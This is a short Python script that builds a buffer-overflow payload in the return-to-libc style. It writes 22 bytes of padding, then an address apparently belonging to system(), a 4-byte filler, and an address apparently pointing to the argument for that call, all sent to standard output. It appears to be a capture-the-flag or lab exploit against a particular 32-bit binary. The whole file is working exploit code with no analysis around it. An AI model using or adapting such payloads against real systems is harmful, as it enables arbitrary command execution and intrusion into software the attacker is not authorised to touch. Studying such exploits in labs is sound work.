import sys
import struct

offset = b'0000'

data = b'A'*22
data += struct.pack('<I', 0x080514d0)
#the offset is here to put the system() call parameter in the right place
data += offset
data += struct.pack('<I', 0x080b884d)
sys.stdout.buffer.write(data)
